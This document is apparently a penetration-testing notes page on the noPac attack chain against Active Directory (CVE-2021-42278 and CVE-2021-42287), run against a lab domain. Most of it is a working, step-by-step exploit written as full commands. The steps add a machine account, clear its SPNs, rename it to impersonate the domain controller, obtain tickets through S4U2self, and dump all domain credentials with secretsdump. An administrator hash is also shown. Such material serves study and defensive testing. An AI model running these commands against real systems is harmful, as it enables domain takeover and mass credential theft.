
# SamAccountName

# CVE-2021-42278 - Name impersonation

Computer accounts should have a trailing `$` in their name (i.e. `sAMAccountName` attribute) but no validation process existed to make sure of it. Abused in combination with CVE-2021-42287, it allowed attackers to impersonate domain controller accounts.

# CVE-2021-42287 - KDC bamboozling

When requesting a Service Ticket, presenting a TGT is required first. When the service ticket is asked for is not found by the KDC, the KDC automatically searches again with a trailing `$`. What happens is that if a TGT is obtained for `bob`, and the `bob` user gets removed, using that TGT to request a service ticket for another user to himself (S4U2self) will result in the KDC looking for `bob$` in AD. If the domain controller account `bob$` exists, then `bob` (the user) just obtained a service ticket for `bob$` (the domain controller account) as any other user 🤯.

# Pré-requis

* A domain controller which is missing the KB5008380 and KB5008602 security patches
* A valid domain user account
* The machine account quota to be above 0

The ability to edit a machine account's sAMAccountName and servicePrincipalName attributes is a requirement to the attack chain. Check with Bloodhound or NetExec :

```bash
nxc ldap winterfell.north.sevenkingdoms.local -u jon.snow -p iknownothing -d north.sevenkingdoms.local -M daclread -o TARGET='testj$'
```

Or the ability to add computers. Validate by checking the machine account quota.

```bash
nxc ldap winterfell.north.sevenkingdoms.local -u jon.snow -p iknownothing -d north.sevenkingdoms.local -M maq
```

# Exploit

What we will do is add a computer, clear the SPN of that computer, rename computer with the same name as the DC, obtain a TGT for that computer, reset the computer name to his original name, obtain a service ticket with the TGT we get previously and finally dcsync;

Add a new computer

```bash
addcomputer.py -computer-name 'samaccountname$' -computer-pass 'ComputerPassword' -dc-host winterfell.north.sevenkingdoms.local -domain-netbios NORTH 'north.sevenkingdoms.local/jon.snow:iknownothing'
```

Clear the SPNs of our new computer (with dirkjan [krbrelayx](https://github.com/dirkjanm/krbrelayx) tool addspn)

```bash
addspn.py --clear -t 'samaccountname$' -u 'north.sevenkingdoms.local\jon.snow' -p 'iknownothing' 'winterfell.north.sevenkingdoms.local'
```

Rename the computer (computer -> DC)

```bash
renameMachine.py -current-name 'samaccountname$' -new-name 'winterfell' -dc-ip 'winterfell.north.sevenkingdoms.local' north.sevenkingdoms.local/jon.snow:iknownothing
```

Obtain a TGT

```bash
getTGT.py -dc-ip 'winterfell.north.sevenkingdoms.local' 'north.sevenkingdoms.local'/'winterfell':'ComputerPassword'
```

Reset the computer name back to the original name

```bash
renameMachine.py -current-name 'winterfell' -new-name 'samaccount$' north.sevenkingdoms.local/jon.snow:iknownothing
```

Obtain a service ticket with S4U2self by presenting the previous TGT

```bash
export KRB5CCNAME=/workspace/winterfell.ccache
getST.py -self -impersonate 'administrator' -altservice 'CIFS/winterfell.north.sevenkingdoms.local' -k -no-pass -dc-ip 'winterfell.north.sevenkingdoms.local' 'north.sevenkingdoms.local'/'winterfell' -debug
```

DCSync by presenting the service ticket

```bash
export KRB5CCNAME=/workspace/administrator@CIFS_winterfell.north.sevenkingdoms.local@NORTH.SEVENKINGDOMS.LOCAL.ccache
secretsdump.py -k -no-pass -dc-ip 'winterfell.north.sevenkingdoms.local' @'winterfell.north.sevenkingdoms.local'
```

Clean up by deleting the computer we created with the administrator account hash we just get

```bash
addcomputer.py -computer-name 'samaccountname$' -delete -dc-host winterfell.north.sevenkingdoms.local -domain-netbios NORTH -hashes 'aad3b435b51404eeaad3b435b51404ee:dbd13e1c4e338284ac4e9874f7de6ef4' 'north.sevenkingdoms.local/Administrator'
```
